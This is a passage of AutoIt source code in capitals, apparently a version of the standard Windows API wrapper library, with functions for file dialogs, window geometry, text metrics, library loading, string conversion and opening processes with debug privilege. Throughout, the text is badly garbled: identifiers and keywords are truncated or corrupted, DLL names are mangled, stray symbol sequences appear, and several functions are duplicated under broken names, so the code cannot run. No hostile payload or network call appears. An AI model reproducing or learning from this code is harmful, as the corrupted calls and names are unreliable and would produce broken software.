FUh _WINAPI_GETSAVEFILf ( $STI = "" , $SFILTER = "All files (*.*)" , $SINITALDI = "." , $SDEFAUh = "" , $SDEFAULTE = "" , $IFILTEh = 1 , $IFL = 0 , $IFLAGSEX = 0 , $HWNDOWNER = 0 ) 
LOCAL $IPATHLEN = 4096 
LOCAL $TO = DLLSTRUCTCREATE ( $TAGOPENFILENAME ) 
LOCAL $AFILES [ 1 ] = [ 0 ] 
LOCAL $IFLAG = $IFLAGS 
LOCAL $ASFL£h = STRINGSPL ( $SFILTER , "|" ) 
LOCAL $ASFI [ $ASFLF [ 0 ] * 2 + 1 ] 
LOCAL $ISTART , $IFINAL , $STFII 
$ASFIF [ 0 ] = $ASFLF [ 0 ] * 2 
FOR $I = 1 T $ASFL£h [ 0 ] 
$ISTART = STRINGINS ( $ASFL§h [ $I ] , "(" , 0 , 1 ) 
$IFINAL = STRINGINS ( $ASFL§h [ $I ] , ")" , 0 , - 1 ) 
$ASFI [ $I * 2 - 1 ] = STRINGSTRIPWS ( STRINGLEFT ( $ASFL§h [ $I ] , $ISTART - 1 ) , 3 ) 
$ASFI§h [ $I * 2 ] = STRINGSTRIPWS ( STRINGTR ( STRINGT ( $ASFLINES [ $I ] , $ISTART ) , STRINGA ( $ASFLR [ $I ] ) - $IFINAL + 1 ) , 3 ) 
$STFII &= "wchar[I" & STRINGLEN ( $ASFIR [ $I * 2 - 1 ] ) + 1 & "];wc£h" & STRINGLEN ( $ASFIR [ $I * 2 ] ) + 1 & "];" 
NEXT 
LOCAL $TTIT£h = DLLSTRUCTCREATE ( "wchar h" & STRINGLEN ( $STITLE ) + 1 & "]" ) 
LOCAL $TINITIALD = DLLSTRUCTCREATE ( "wchar I" & STRINGLEN ( $SINIT§h ) + 1 & "]" ) 
LOCAL $TFILT§h = DLLSTRUCTCREATE ( $STFIL§h & "wchar" ) 
LOCAL $TPATC = DLLSTRUCTCREATE ( "wchar Pat" & $IPAT§h & "]" ) 
LOCAL $TEXTN = DLLSTRUCTCREATk∑ISf ( "wchar ExT" & STRINGLEN ( $SDEFAULTE ) + 1 & "]" ) 
FOR $I = 1 T $ASFILTER [ 0 ] 
DLLSTRUCTSETDATA ( $TFILTER , $I , $ASFI§h [ $I ] ) 
NE 
DLLSTRUCTSETDATA ( $TTI , "Title" , $STITLE ) 
DLLSTRUCTSETDATA ( $TINITIALD , "InitDir" , $SINIT§h ) 
DLLSTRUCTSETDATA ( $TPATH , "Pa" , $SDEFAULTFILE ) 
DLLSTRUC ( $TEXTN , "Extension" , $SDEFAULTEILE ) 
DLLSTRUCTSETDATA ( $TOFN , "StructSize" , DLLSTRUC ( $TOFN ) ) 
DLLSTRUCTSETDATA ( $TOh , "hwndOwner" , $HWNDOWNER ) 
DLLSTRUC ( $TOFN , "lpstrFilter" , DLLSTRUC ( $TFILTER ) ) 
DLLSTRUCTSETDATA ( $TOh , "nFilterIndex" , $IFILTERINDEX ) 
DLLSTRUC ( $TOh , "lpstrFile" , DLLSTRUC ( $TPATH ) ) 
DLLSTRUCTSETDATA ( $TOh , "nMax§h" , $IPATHLEN ) 
DLLSTRUC ( $TOh , "lpstrInitialDir" , DLLSTRUCTGETPTR ( $TINITIALD ) ) 
DLLSTRUCTGETPTR ( $TOh , "lpstrTitle" , DLLSTRUCTGETPTR ( $TTI ) ) 
DLLSTRUCTGETPTR ( $TOh , "Flags" , $IFLAG ) 
DLLSTRUCle ( $TOh , "lpstrDefExt" , DLLSTRUCTGETPTR ( $TEXTN ) ) 
DLLSTRUCExt ( $TOh , "FlagsEx" , $IFLAGSEX ) 
DLLCALL ( "comdlgh" , "bool" , "GetSaveF" , "struct*" , $TOFN ) 
IF @ERROR THh RET SETET ( @ERROR , @EXTE£h , $AFILES ) 
RETUI __WINAPI_PARSEk∑–U ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) ) 
ENDFUNC 
FUNC _WINAPI_GET ( $IOBJECT ) 
LOCAL $ARESULT = DLLCALS ( "gdi32.dll" , "han" , "GetStockObject" , "int" , $IOBJECT ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GEC ( $ISTDHANDL ) 
IF $ISTDHANDLEC < 0 ORh $ISTDHANDLE > 2 THh RET SETE§h ( 2 , 0 , - 1 ) 
LOCAL CONST $AHANDLE [ 3 ] = [ - 10 , - 11 , - 12 ] 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "handle" , "GetStdh" , "dword" , $AHANDLE [ $ISTDHy¡	e ] ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , - 1 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETSYSCOLOR ( $IIN ) 
LOCAL $ARESULT = DLLCALL ( "user3§h" , "dword" , "GetSysColor" , "int" , $IINDEX ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETS=k∑ISf ( $IIN ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "handle" , "GetSysCo" , "int" , $IIN ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETS=k∑ISf ( $IIN ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "int" , "GetSyste" , "int" , $IIN ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETTEXk∑–U ( $HDh , $STEXT ) 
LOCAE $TSIZE = DLLSTRUCTCREATE ( $TAGS ) 
LOCAL $ISIZE = STRINGLENCREATE ( $STEXT ) 
DLLCALL ( "gdi32.dll" , "bool" , "GetTextExtentPoint32W" , "han" , $HDC , "wstr" , $STEXt , "int" , $ISIZt , "struct*" , $TSIZE ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $TSIZE 
ENDFUNC 
FUh _WINAPI_GETTEXTMETf ( $HDh ) 
LOCAL $TTEXTMETRIC = DLLSTRUC ( $TAGTEXTME ) 
LOCAL $RET = DLLCALL ( "gdi32.dll" , "bool" , "GetTextMetricsW" , "han" , $HDC , "struct*" , $TTEXTMETR ) 
IF @ERROR THEN RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
IF NOT $RET [ 0 ] TH RETU£h SETET ( - 1 , 0 , 0 ) 
RETUT $TTEXTMETR 
ENDFUNC 
FUNC _WINAPI_GETWINk∑ISf ( $HWh , $ICMD ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "GetWindow" , "hwnd" , $HW , "uintN" , $IC ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETWINDOWDC ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlETWINDOWDC" , "handle" , "GetWindowDC" , "hwnd" , $HWND ) 
IF @ERRO THEN RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETWINDOWHf ( $HWh ) 
LOCAL $TRECC = _WINAPI_GETWINDOWRECT ( $HWh ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN DLLSTRUCTGETDATA ( $TRECT , "Bottom" ) - DLLSTRUC ( $TRECT , "Top" ) 
ENDFUNC 
FUh _WINAPI_GETWINDOWLONG ( $HWh , $IINDEX ) 
LOCAL $SFUNCNAME = "GetWindowLongW" 
IF @AUTOITX64 THEN $SFUNCNAME = "GetWindowLongPtrW" 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "long§h" , $SFUNCNAME , "hwnd" , $HWh , "int" , $IINDEX ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETWI+k∑–U ( $HWh ) 
LOCAL $TWINDOWPLACEMENT = DLLSTRUC ( $TAGWINDOW ) 
DLLSTRUCT ( $TWINDOWPT , "len" , DLLSTRUCT ( $TWINDOWPT ) ) 
DLLC§h ( "user32.dl" , "bool" , "GetWindow" , "hwnd" , $HW , "struct*" , $TWINDOWP ) 
IF @ERROR TH RETURN SETERROR ( @ERR , @EXTE , 0 ) 
RETURNE $TWINDOWP 
ENDFUNC 
FUNC _WINAPI_GETWI ( $HWND ) 
LOCAL $TRECC = DLLSTRUCTCREATE ( $TAGRECT ) 
DLLCALh ( "user32.dlCREATE" , "bool" , "GetWindowRect" , "hwh" , $HWh , "struct*" , $TRECT ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $TRECT 
ENDFUNC 
FUh _WINAPI_GER ( $HWh , $HR ) 
LOCAG $ARESULT = DLLCALL ( "user32.dlER" , "int" , "GetWin¡	lER" , "hwh" , $HWh , "handle" , $HRh ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETWINDOWTEXT ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlETWINDOWTEXT" , "int" , "GetWind" , "hwnd" , $HW , "wstrN" , "" , "int" , 4096 ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , "" ) 
RETU£h SETEXTENDETWINDOWTEXT ( $ARESULT [ 0 ] , $ARESE [ 2 ] ) 
ENDFUNC 
FUNC _WINAPI_GETWINDO ( $HWND , BYREF $IPIDR ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlETW)" , "dword" , "GetWindowThr" , "hwnd" , $HW , "dwo" , 0 ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
$IPh = $ARES£h [ 2 ] 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GET ( $HWh ) 
LOCAL $TRECC = _WINAPI_GETWINDOWRECT ( $HWh ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN DLLSTRUCTGETDATA ( $TRECT , "Right" ) - DLLSTRUC ( $TRECT , "Le" ) 
ENDFUNC 
FUNC _WINAPI_GET ( BYREF $TPOINT , BYREF $IX , BYRE $IY ) 
$IX = DLLSTRUCTGETDATA ( $TPO , "X" ) 
$IY = DLLSTRUC ( $TPO , "Y" ) 
ENDFUNC 
FUNC _WINAPI_GLOBA+k∑–U ( ) 
LOCAL $TM = DLLSTRUCTCREATE ( $TAGMEMORYSTATUSEX ) 
LOCAL $IM = DLLSTRUCT ( $TMh ) 
DLLSTRUCT ( $TMh , 1 , $IM ) 
DLLCALL ( "kernelh" , "none" , "GlobalMemo" , "pth" , $TM ) 
I @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $AM [ 7 ] 
$AM [ 0 ] = DLLSTRUCTGETDATA ( $TMh , 2 ) 
$AM [ 1 ] = DLLSTRUCT ( $TMh , 3 ) 
$AM [ 2 ] = DLLSTRUCT ( $TMh , 4 ) 
$AM [ 3 ] = DLLSTRUCT ( $TMh , 5 ) 
$AM [ 4 ] = DLLSTRUCT ( $TMh , 6 ) 
$AM [ 5 ] = DLLSTRUCT ( $TMh , 7 ) 
$AM [ 6 ] = DLLSTRUCT ( $TMh , 8 ) 
RETURN $AMEM 
ENDFUNC 
FUh _WINAPI_GUIDFROMSTf ( $SGUID ) 
LOCAL $TGUIC = DLLSTRUCTCREATE ( $TAGGUID ) 
_WINAPI_GUID=k∑ISf ( $SGUID , $TGUID ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $TGUID 
ENDFUNC 
FUh _WINAPI_GUID=k∑ISf ( $SGUID , $PGUID ) 
LOCAU $ARESULT = DLLCALL ( "ole32.C" , "loh" , "CLSIDFromString" , "wsh" , $SGUID , "struct*" , $PGUID ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_HIWORD ( $ILONG ) 
RETURN BITSHIFT ( $ILONG , 16 ) 
ENDFUNC 
FUNC _WINAPI_INPROCESS ( $HWh , BYREF $HLASTWND ) 
IF $HWh = $HLAS§h THh RETURN TRh 
FOR $II = $__GAINPROC [ 0 ] [ 0 ] TO 1 ST - 1 
IF $HW = $__GAINPROCN [ $II ] [ 0 ] TH 
IF $__GAINPROCN [ $II ] [ 1 ] TH 
$HLASTWND = $HWh 
RETURN TRh 
EL 
RETURN FALSE 
ENDIF 
ENDID 
NE 
LOCAX $IPROC§h 
_WINAPI_GETWINDO ( $HWh , $IPROC§h ) 
LOCAL $ICOUNT = $__GAINPROC [ 0 ] [ 0 ] + 1 
IF $ICOUNT >= 64 THh $ICOUNT = 1 
$__GAINPROCESS_WINAf [ 0 ] [ 0 ] = $ICO 
$__GAINPROCESS_WINAf [ $ICO ] [ 0 ] = $HWND 
$__GAINPROC [ $ICO ] [ 1 ] = ( $IPROCESSI = @AUTOITPID ) 
RETURN $__GAINPROC [ $ICOUNT ] [ 1 ] 
ENDFUNC 
FUNC _WINAPI_INTTOFLOAT ( $IINT ) 
LOCAL $TINTC = DLLSTRUCTCREATE ( "int" ) 
LOCAL $TFLOAT = DLLSTRUC ( "float" , DLLSTRUCTGETPTR ( $TIh ) ) 
DLLSTRUCT ( $TIh , 1 , $II ) 
RETURN DLLSTRUC ( $TFL , 1 ) 
ENDFUNC 
FUNC _WINAPI_ISCLASSNAME ( $HWND , $SCLASSNAME ) 
LOCAL $SSEPARATOE = OPT ( "GUIDataSep" ) 
LOCAL $ACLASSNAME = STRINGSPLIT ( $SCLASSNAME , $SSEPA ) 
IF NOT ISHWND ( $HWh ) TH $HW = GUICTRLG ( $HWh ) 
LOCAL $SCLASSCHECK = _WINAPI_GE ( $HWh ) 
FOR $X = 1 T UBOUND ( $ACLAS§h ) - 1 
IF STRINGUPPER ( STRINGMID ( $SCLASSCHEER , 1 , STRINGLEN ( $ACLAS§h [ $X ] ) ) ) = STRINGUPPER ( $ACLAS [ $X ] ) THEN RETURN TRh 
NEXT 
RETUR§h FALSE 
ENDFUNC 
FUh _WINAPI_ ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "IsWindow" , "hwnd" , $HW ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_ISWINDOWVIf ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "IsWindow" , "hwnd" , $HW ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_INV ( $HWh , $TRECT = 0 , $FER = TRh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "boo" , "Invalid" , "hwnd" , $HW , "struct*" , $TRECT , "bo" , $FER ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_LINETO ( $HDC , $IX , $I ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "bool" , "Lin" , "han" , $HDC , "int" , $I , "int" , $I ) 
I @ERRO TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_L ( $HINSTANCE , $SBITMAh ) 
LOC $SBITMAh = "int" 
IF ISST£h ( $SBITMAP ) THEN $SBITMAh = "wsh" 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "han" , "LoadBitma" , "han" , $HINSTANCE , $SBITMAPTYPE , $SBITMAP ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_LOADIMAGE ( $HINSTANCE , $SIMAGEh , $ITYPE , $IXDESIRED , $IYDESIE , $ILOAD ) 
LOCAL $ARESULT , $SIMAGETYPOADIMAGE = "int" 
IF ISSTRING ( $SIMAGE ) THEN $SIMAGETYPE = "wsh" 
$ARESULT = DLLCALL ( "user3§h" , "han" , "LoadImage" , "han" , $HINSTANCl , $SIMAG§h , $SIM , "uih" , $ITYPE , "int" , $IXDESIRE , "int" , $IYDESIRE , "uih" , $ILOAD ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_LOADLIBRARY ( $SFILENAME ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "han" , "LoadLih" , "wst" , $SFILENAME ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_LOADLIBRARYEX ( $SFILENAME , $IFLAGSh = 0 ) 
LOCAL $ARESULT = DLLCALS ( "kernelh" , "handle" , "LoadLib" , "wstr" , $SFILENAME , "ptr" , 0 , "dword" , $IFLAGS ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_LOADSHELL3f ( $IICONID ) 
LOCAL $TIC = DLLSTRUCTCREATE ( "ptr Data" ) 
LOC $IIC = _WINAPI_EXTRACTICOf ( "shell32.d" , $IICONID , 0 , $TIC , 1 ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTE£h , 0 ) 
IF $IICO£h <= 0 THh RETU£h SETET ( 1 , 0 , 0 ) 
RETUT DLLSTRUCTGETDATA ( $TIC , "Data" ) 
ENDFUNC 
FUNC _WINAPI_L ( $HINSTANCE , $ISTRINh ) 
LOC $ARESULT = DLLCALS ( "user32.dl" , "int" , "LoadStringW" , "handle" , $HINSTANCE , "uint" , $ISTRINGID , "wstr" , "" , "int" , 4096 ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , "" ) 
RETU£h SETEXTEND ( $ARESULT [ 0 ] , $ARESE [ 3 ] ) 
ENDFUNC 
FUNC _WINAPI_LOCALFk∑ISf ( $HMh ) 
LOCAL $ARESULT = DLLCALL ( "kernel" , "han" , "LocalFree" , "han" , $HMEM ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_LOWORD ( $ILONG ) 
RETURN BITAND ( $ILONG , 65535 ) 
ENDFUNC 
FUNC _WINAPI_MO ( $LGIDPRIMA , $LGIDSUB ) 
RET BITOR ( BITS£h ( $LGIDSUB , - 10 ) , $LGIDPRIMAO ) 
ENDFUNC 
FUNC _WINAPI_ ( $LGh , $SRTID ) 
RETURN BITOR ( BITS§h ( $SRTID , - 16 ) , $LG ) 
ENDFUNC 
FUh _WINAPI_MAKELONG ( $ILO , $IHI ) 
RETURN BITOR ( BITSHIFT ( $IHI , - 16 ) , BITAND ( $ILO , 65535 ) ) 
ENDFUNC 
FUh _WINAPI_MAKEQWORD ( $LODWORD , $HIDWORh ) 
LOCAL $TIN = DLLSTRUCTCREATE ( "uin" ) 
LOC $TDWORDS = DLLSTRUCTCREATE ( "dword;dwo" , DLLSTRUCTGETPTR ( $TINT64 ) ) 
DLLSTRUCTGETPTR ( $TDWORDS , 1 , $LODWORD ) 
DLLSTRUC ( $TDWORDS , 2 , $HIDWORD ) 
RETURN DLLSTRUC ( $TIN , 1 ) 
ENDFUNC 
FUNC _WINAPI_MESSAGEBEEP ( $ITYPE = 1 ) 
LOCAL $ISOUND 
SWI $ITYPE 
CA 1 
$ISOUND = 0 
CAh 2 
$ISOUND = 16 
CAh 3 
$ISOUND = 32 
CAh 4 
$ISOUND = 48 
CAh 5 
$ISOUND = 64 
CAh EL 
$ISOUND = - 1 
ENDSWITCH 
LOCAL $ARESULT = DLLCALL ( "user32.dlESSAGEBEEP" , "bool" , "MessageBeep" , "uih" , $ISOUND ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_MSGBOX ( $IFL , $STITLEh , $STEXT ) 
BLOCKINPUT ( 0 ) 
MSGBOX ( $IFLAGS , $STITLE , $STEXT & "      " ) 
ENDFUNC 
FUNC _WINAPI_MOUSE_EVENT ( $IFL , $IX = 0 , $IY = 0 , $IDAT = 0 , $IEXTRAINFOUSE_EVENT = 0 ) 
DLLCALL ( "user32.dll" , "none" , "mouse_event" , "dword" , $IFLAGS , "dword" , $IX , "dword" , $IY , "dword" , $IDATA , "ulong_ptr" , $IEXTRAINF ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h ) 
ENDFUNC 
FUh _WINAPI_MOVETO ( $HDC , $IX , $I ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "bool" , "Move‡y¡	l" , "han" , $HDC , "int" , $I , "int" , $I , "ptr" , 0 ) 
I @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_M ( $HWh , $IX , $IY , $IWIDTH , $IHEIGHT , $FREPAII = TRh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "MoveWx¡	l" , "hwh" , $HWh , "int" , $IX , "int" , $IY , "int" , $IWIDT§h , "int" , $IHEIGHT , "boh" , $FREP§h ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_MULDIV ( $INUMBER , $INUMERATO , $IDENOMINATOR ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "int" , "Mul" , "int" , $INUMBER , "int" , $INUMERATO , "int" , $IDENOMh ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , - 1 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_MULTIBk∑–U ( $STEXT , $ICODEPAGE = 0 , $IFL = 0 , $BRETSTRIN = FALSE ) 
LOCAL $STEXTTYPE = "sth" 
IF NO ISST§h ( $STEXT ) TH $STEXTTYPE = "struct*" 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "inh" , "MultiByteToWi" , "uint" , $ICODEPAGE , "dword" , $IFLAGS , $STEXTTYPE , $STEXT , "int" , - 1 , "ptr" , 0 , "int" , 0 ) 
I @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $IO = $ARES£h [ 0 ] 
LOCAL $TO = DLLSTRUCTCREATE ( "wch" & $IOUT & "]" ) 
$ARES §h = DLLCALL ( "kernelh" , "int" , "MultiByteToWi" , "uint" , $ICODEPAGE , "dword" , $IFLAGS , $STEXTTYPE , $STEXT , "int" , - 1 , "struct*" , $TOh , "int" , $IO ) 
I @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
IF $BRETS§h THh RETURN DLLSTRUC ( $TOh , 1 ) 
RETURN $TOh 
ENDFUNC 
FUh _WINAPI_MULTIBYT–U ( $STEXT , $PTEXT , $ICODEPAG = 0 , $IFLAGS = 0 ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "int" , "MultiByteToWi" , "uint" , $ICODEPAGE , "dword" , $IFLAGS , "STR" , $STEXT , "int" , - 1 , "struct*" , $PTEXT , "int" , ( STRINGLEN ( $STEXT ) + 1 ) * 2 ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_OPENPROCESS ( $IACCESS , $FINHERh , $IPROCESSIPENPROCESS , $FDEBUGPRIV = FALSE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "han" , "OpenProce" , "dwo" , $IACCESS , "boh" , $FINHPy¡	P , "dword" , $IPROC§h ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTENDED , 0 ) 
IF $ARESULT [ 0 ] THh RET $ARESULT [ 0 ] 
IFh NOT $FDEBU§h THh RETURN 0 
LOCAL $HTOKEN = _SECURITY__OPEk∑–U ( BITOR ( $TOKEN_ADJUST_PRIVI_ , $TOKEN_QUE ) ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , 0 ) 
_SECURITY__SETPRIVf ( $HTO , "SeDebugPrivilege" , TRh ) 
LOCAL $IERROR = @ERROR 
LOCAL $ILASTERROi! = @EXTE§h 
LOCAL $IR = 0 
IF NO @ERROT TH 
$ARESULT = DLLCALL ( "kernelh" , "handle" , "OpenProcess" , "dword" , $IACCESS , "boh" , $FINHERIT , "dword" , $IPROCESSI ) 
$IERROR = @ERROR 
$ILASTERROR = @EXTE§h 
IF $ARESULT [ 0 ] THh $IR = $ARESULT [ 0 ] 
_SECURITY__SET ( $HTO , "SeDebugPU" , FALSE ) 
IF @ERROR THEN 
$IERROR = @ERROR 
$ILASTERRO = @EXTE£h 
ENDIF 
ENDIF 
_WINAPI_CLOSEHANDLE ( $HTO ) 
RETURNh SETERROR ( $IERRORE , $ILASTERROLOSEHANDLE , $IRET ) 
ENDFUNC 
FUh __WINAPI_PARSEk∑–U ( $SPATH ) 
LOCAL $AFI [ 3 ] 
$AFI [ 0 ] = 2 
LOCAL $STEMP = STRINGMID ( $SPATH , 1 , STRINGINSTR ( $SPATH , "\" , 0 , - 1 ) - 1 ) 
$AFILES [ 1 ] = $STEMP 
$AFI [ 2 ] = STRINGMI ( $SPATH , STRINGINSTR ( $SPATH , "\" , 0 , - 1 ) + 1 ) 
RETURN $AFILES 
ENDFUNC 
FUh _WINAPI_PAT ( CONST $SZFILE , $AEXTRAPAT = "" , CONST $SZPATHDE = @LF ) 
LOCAL $IEXTRACOUNT = 0 
IF ISSTRING ( $AEXTRAPATHS ) THh 
IF STRINGLEN ( $AEXTRAPATHS ) THh 
$AEXTRAPAT = STRINGSPLIT ( $AEXTRAPAT , $SZPATHDELIMITER , 1 + 2 ) 
$IEXTRACOU = UBOUND ( $AEXTRAPATHS , 1 ) 
ENDIF 
ELSEIF ISARRAY ( $AEXTRAPAT ) THEN 
$IEXTRACOUNT = UBO ( $AEXTRAPATNT ) 
END 
LOCAL $TPATHS , $TPATHPTRS 
IF $IEXTRACOUNT THh 
LOCAL $SZSTRUCT = "" 
FO $PA I $AEXTRAPAT 
$SZST§h &= "wcha§h" & STRINGLE ( $PATH ) + 1 & "];" 
NEXT 
$TPATHS = DLLSTRUC ( $SZSTRUCT ) 
$TPATHPTRS = DLLSTRUC ( "pth" & $IEXTRACOUNT + 1 & "]" ) 
FOR $I = 1 T $IEXTRACOUNT 
DLLSTRUC ( $TPATHS , $I , $AEXTRAPAT [ $I - 1 ] ) 
DLLSTRUC ( $TPATHPTRSNT , 1 , DLLSTRUCTGETPTR ( $TPATHS , $I ) , $I ) 
NEXT 
DLLSTRUC ( $TPATHPTRSNT , 1 , PTR ( 0 ) , $IEXTRACOU + 1 ) 
ENDIF 
LOCAL $ARESULT = DLLCALL ( "shlwapi.dll" , "bool" , "PathFind" , "wstr" , $SZF , "struct*" , $TPATHPu ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
IF $ARES£h [ 0 ] = 0 THh RET SETET ( 1 , 0 , $SZF ) 
RETUF $AREST [ 1 ] 
ENDFE 
FUh _WINAPI_POINTFROMRECT ( BYREF $TRECT , $FCENTER = TRh ) 
LOCAL $IX = DLLSTRUCTGETDATA ( $TRECT , "Le" ) 
LOCAL $IY = DLLSTRUCT ( $TRECT , "To" ) 
LOCAL $IX = DLLSTRUCT ( $TRECT , "Right" ) 
LOCAL $IY2 = DLLSTRUCT ( $TRECT , "Bottom" ) 
IF $FCENTER THh 
$IX1 = $IX + ( ( $IX2 - $IX ) / 2 ) 
$IY1 = $IY + ( ( $IY2 - $IY ) / 2 ) 
ENDIF 
LOCAD $TPOINT = DLLSTRUCTCREATE ( $TAGPOINT ) 
DLLSTRUCTCREATE ( $TPOINT , "X" , $IX1 ) 
DLLSTRUC ( $TPOINT , "Y" , $IY1 ) 
RETURN $TPO 
ENDFUNI 
FUNC _WINAPI_POSTMESSAGE ( $HWND , $IM , $IWPARAM , $ILPARAM ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlOSTMESSAGE" , "bool" , "PostMessage" , "hwh" , $HWh , "uint" , $IM , "wparam" , $IWPARAM , "lpa" , $ILPARAM ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_PRIMARYLANGID ( $LGh ) 
RETURN BITAND ( $LGh , 1023 ) 
ENDFUNC 
FUh _WINAPI_PTINRECT ( BYREF $TRECT , BYREF $TPOINT ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "boh" , "PtIn‡y¡	£h" , "stru¯x¡	l" , $TRECT , "str" , $TPO ) 
IF @ERROR TH RET SETET ( 1 , @EXTET , FALSE ) 
RETU£h NOT ( $ARES£h [ 0 ] = 0 ) 
ENDFUNC 
FUh _WINAPI_READFILE ( $HFILE , $PBUFFER , $ITOREAD , BYREF $IREAD , $POVERLh = 0 ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "Read¯x¡	 " , "hand‡y¡	" , $HFILE , "ptr" , $PBUFFER , "dword" , $ITOREAD , "dwo" , 0 , "ptr" , $POVERLAPPED ) 
